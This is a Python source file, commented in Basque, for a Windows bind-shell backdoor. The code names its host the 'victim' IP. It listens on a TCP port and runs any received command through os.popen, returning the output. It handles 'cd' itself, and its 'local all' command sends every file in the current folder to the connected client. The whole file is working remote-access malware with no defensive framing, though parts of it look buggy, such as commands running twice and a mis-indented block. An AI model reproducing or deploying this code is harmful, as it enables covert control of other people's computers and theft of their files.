import os
import socket 
import time
import win32api
import sys




class server(object):
    def __init__(self,ip_bictima,portua,koneksioak):
        print(ip_bictima)
        print(portua)
        print(koneksioak)
        print("\n")
        self.so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.so.bind((ip_bictima,portua))
        self.so.listen(koneksioak)
        self.soc , addr = self.so.accept()
    
    

    def koneksioa(self):
      while True:
          user = win32api.GetUserName()
          url = os.getcwd()#ruta aktuala 
          self.soc.send(bytes( user + "@" + url,encoding = 'utf-8'))# bidali ruta aktuala
          hartuta = self.soc.recv(1024) # guk bidalitako mezua hartuko du (1024) bytes
          stri = str(hartuta,encoding='utf-8')# guk bialitako mezu string modura biurtuko du
          if stri == "itxi": #mezua itxi baldinbada buklea mozten da 
              break 
          #funtzioak
          comand = stri.split(" ")#honen bitartez gure mezua zatitzen dugu espazioaren bitartez
          if comand[0].lower() == "cd" and len(comand) > 1:#mezuaren lenego partea cd bada 
              erantzuna = " "
              if comand[1] == "..":#mezuaren lenego partea .. bada 
                url_a = url.split("\\")[:-1] #gure datuak \\ kontuan hartuta array bat sortzen du ondoren azkeneko array a kentzen du
                url = ""# baliable buleano bat 
                for x in url_a:# url_a arraya zearkatzeko x datuan bitartez
                  url += x + "\\"#ruta osatzeko metodoa
                os.chdir(url)#guk sortu dugun rutara juateko
              else:
                  lo = ""
                  if len(comand) > 2:# mezuaren zatiak 2 baino handiagoak badira
                      for x in comand[1:len(comand)]:# comadoaren lenengo zatia kenduta gainontzeko guztia kentzxen du eta x bitartez dena zearkatzen du
                          lo += x + " " #harturiko zati guztiak lotzen ditu 
                      comand[1] = lo # comand[1] egindako lotura izango da 
                  ruta_absoluta = False # ruta absolutua false balioa edukiko du
                  drives = win32api.GetLogicalDriveStrings()#gure diskoaren identifikadorea hartuko ditu 
                  rutak = drives.split("\000")[:-1] #identifikadore bakoitza arry batean sartuko ditu barra kendurik
                  ar_ruta = comand[1].split("\\")# guk sartutako mezua \\ bitartez sailkatuko du
                  for disk in rutak:# rutak zearkatuko ditu disk bitartez
                      if disk[:-1].lower() == ar_ruta[0].lower():# identifikadorea eta lehengo arrya igualak badira ruta absolutua true izango da
                          ruta_absoluta = True
                  if ruta_absoluta == True: # ruta absolutua true baldinbada 
                    try:
                        os.chdir(comand[1].lower())# idatzitako rutara abiatuko gara
                    except IOError as e:# ruta gaizki baldinbadago mezua errore bat bidaliko du
                        erantzuna = "comandoa gaizki dago"
                  if ruta_absoluta == False:# false baldinbada
                    try:
                        ruta_re = url + "\\" + comand[1] #gure ruta contuan harturik zuk idatzitako zatia geitukodu ruta bat biurtuz
                        os.chdir(ruta_re.lower()) # idatzitako rutara juango gera 
                    except IOError as e: # ruta gaizki baldinbadago errore bat bidaliko dizu 
                         erantzuna = "comandoa gaizki dago"
              self.soc.send(bytes(erantzuna,encoding = 'utf-8')) # erantzuna bidaliko du 
          #if comand[0].lower() == "local" and len(comand) > 1:
             #erantzuna = "datuak OK"
             #self.soc.send(bytes(erantzuna,encoding = 'utf-8'))  # erantzuna bidaliko du 
          #   print("local")
          else:
            erantzuna = " " #erantzuna utza izango da
            balioa = os.popen(stri,'r',1).close()# guk idatzitako komandoa exekutatuko du errorearen mezua bidaliz
            erantzuna = os.popen(stri,'r',1).read()#komandoaren errorea  
            print(erantzuna)
            print(balioa)   
            if balioa == 1:# errorearen balioa 1 baldinbada 
                erantzuna = "errorea"
            if balioa == 2:# errorearen balioa 2 baldinbada 
                erantzuna = "ez dazkazu baimenik"
            if balioa == None and stri != "net user"  : 
               erantzuna = "informazio ezezaguna" 
            erantzuna_byt = bytes(erantzuna,encoding = 'utf-8')
            luz = str(sys.getsizeof(erantzuna_byt))
            print(luz)
            self.soc.send(bytes(luz,encoding = 'utf-8'))#batuaren luzehera bidaltzen diogu
            self.soc.recv(1024)#luzehera ongi iritsi dela adierazten diogu
            self.soc.send(bytes(erantzuna,encoding = 'utf-8'))#erantzuna bidaltzeko 
          if comand[0].lower() == "local" and len(comand) > 1:
             erantzuna = "datuak OK"
             if comand[1].lower() == "all":
                di = os.listdir(url)
                for x in di:
                      if os.path.isdir(url + "\\" + x) != True:
                           fichategia = open(x,'rb').read()
                           luz = str(sys.getsizeof(fichategia))
                           luz_send = self.soc.send(bytes(luz,encoding = 'utf-8')) 
                           self.soc.recv(1024)
                           fich_send = self.soc.sendall(fichategia)
                           self.soc.recv(1024)
                           izena_send = self.soc.send(bytes(x,encoding = 'utf-8'))
                  self.soc.send(bytes("0",encoding = 'utf-8'))
                  self.soc.recv(1024)
              else:
                erantzuna = "comandoa gaizki dago"
             self.soc.send(bytes(erantzuna,encoding = 'utf-8'))  # erantzuna bidaliko du 
             print("local") 
          #funtzioak
          print(self.soc.recv(1024))#mezua ongi iritzi dela adirezten du
      self.so.close()#tcp koneksioa amaitu
      self.soc.close()#tcp koneksioa amaitu

ser = server("192.168.0.10",9999,1)
ser.koneksioa()




#recv mezua lortzeko balio du udp protokoloan
#send mezua bidaltzeko balio du udp protokoloan






